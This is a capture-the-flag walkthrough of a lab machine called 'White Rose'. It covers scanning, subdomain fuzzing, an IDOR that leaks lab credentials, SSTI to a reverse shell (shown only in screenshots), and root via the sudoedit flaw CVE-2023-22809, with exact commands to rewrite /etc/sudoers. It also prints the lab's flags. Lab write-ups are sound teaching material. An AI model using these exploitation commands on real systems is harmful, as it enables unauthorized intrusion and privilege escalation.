

## Scanning

We start with the scanning phase using the `nmap` tool:

```bash
nmap -p- --open -Pn -n -sV --min-rate 5000 -sS <HOST> -oN white -vvv
```

We can see that the open ports are `22/ssh` and `80/http`:

```plaintext
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

When checking port **80**, we see that it has a domain. We register the domain in `/etc/hosts` and find a maintenance page:

<img src="/budahacksecurity/uploads/md_images/white/white.png" style="max-width:100%; border-radius:8px;">

---

## Subdomain Enumeration

We search for subdomains using `ffuf`:

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cyprusbank.thm -H "HOST:FUZZ.cyprusbank.thm" -fw 1
```

We find the following subdomains:

```plaintext
www
admin
```

We add the domains to the `/etc/hosts` file. When visiting the `admin` subdomain, we find a login page:

<img src="/budahacksecurity/uploads/md_images/white/white2.png" style="max-width:100%; border-radius:8px;">

---

## Initial Access

We log in using the provided credentials:

* User: `Olivia Cortez`
* Password: `olivi8`

Inside the page, we review user conversations:

<img src="/budahacksecurity/uploads/md_images/white/white3.png" style="max-width:100%; border-radius:8px;">

We observe an **IDOR vulnerability**, which allows us to view previous conversations. Here we find the administrator credentials:

```plaintext
User: Gayle Bev
Password: p~]P@5!6;rs558:q
```

When logging in with these credentials, we can access additional information and obtain the first answer:

<img src="/budahacksecurity/uploads/md_images/white/white4.png" style="max-width:100%; border-radius:8px;">

---

## Connection to the Machine

We intercept the password reset request using Burp Suite:

<img src="/budahacksecurity/uploads/md_images/white/white5.png" style="max-width:100%; border-radius:8px;">

The reported error mentions `ejs`, indicating a possible **SSTI vulnerability**. We create a reverse shell encoded in Base64 and send it using Burp Suite:

<img src="/budahacksecurity/uploads/md_images/white/white7.png" style="max-width:100%; border-radius:8px;">

We successfully connect to the machine:

<img src="/budahacksecurity/uploads/md_images/white/white8.png" style="max-width:100%; border-radius:8px;">

For an interactive shell, we run:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg
```

---

## First Flag

We use the `find` command to locate the `user.txt` flag:

```bash
find / -name user.txt 2>/dev/null
```

The flag is located in `/home/web`:

```plaintext
THM{4lways_upd4te_uR_d3p3nd3nc!3s}
```

---

## Privilege Escalation

When running `sudo -l`, we see that we can use `sudoedit`:

```plaintext
User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

We research the `sudoedit` version (`1.9.12p11`) and find the vulnerability **CVE-2023-22809**. We configure the `SUDO_EDITOR` environment variable to modify the `sudoers` file:

```bash
export SUDO_EDITOR='nano -- /etc/sudoers'
sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

We give full permissions to the `web` user in `sudoers`:

```plaintext
web ALL:(ALL:ALL) NOPASSWD: ALL
```

Then we run `sudo su` to become root and obtain the `root.txt` flag:

```plaintext
THM{4nd_uR_p4ck4g3s}
```

---

## Conclusion

With this, we complete the **White Rose** machine. Good job!
